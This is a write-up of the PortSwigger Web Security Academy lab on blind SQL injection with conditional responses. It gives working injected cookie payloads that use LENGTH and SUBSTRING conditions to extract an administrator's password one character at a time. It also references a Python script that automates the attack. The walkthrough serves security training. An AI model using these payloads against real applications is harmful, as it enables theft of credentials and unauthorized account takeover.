# Blind SQL injection with conditional responses

**Lab Url**: [https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses](https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses)

## Objective

This lab contains a blind SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie.

The results of the SQL query are not returned, and no error messages are displayed. But the application includes a **Welcome back** message in the page if the query returns any rows.

The database contains a different table called `users`, with columns called `username` and `password`. You need to exploit the blind SQL injection vulnerability to find out the password of the `administrator` user.

To solve the lab, log in as the `administrator` user.

## Solution

The application uses a tracking cookie that is passed into a SQL query. The page displays "Welcome back!" only when the query returns rows, allowing us to infer whether our injected conditions are true or false. We can use this to extract the administrator's password character by character.

### Step 1: Determine the password length

The `LENGTH(password)` function returns the number of characters. Test each possible length by checking whether "Welcome back!" appears:

```http
Cookie: TrackingId=' UNION SELECT NULL FROM users WHERE username='administrator' AND LENGTH(password)=N--
```

When "Welcome back!" appears, `N` is the correct length.

### Step 2: Extract the password character by character

Use `SUBSTRING(password, N, 1)` to extract one character at a time. Test each candidate character (digits and letters) for each position:

```http
Cookie: TrackingId=' UNION SELECT NULL FROM users WHERE username='administrator' AND SUBSTRING(password,1,1)='a'--
Cookie: TrackingId=' UNION SELECT NULL FROM users WHERE username='administrator' AND SUBSTRING(password,2,1)='b'--
...
```

When "Welcome back!" appears, the guessed character is correct.

### Step 3: Login

Log in as `administrator` with the recovered password to solve the lab.

---

**Automation script:** A Python script is available at [`lab_11_script.py`](../scripts/lab_11_script.py) that automates the entire process:

```bash
python3 lab_11_script.py -u https://LAB-ID.web-security-academy.net/ -s YOUR-SESSION-COOKIE
```
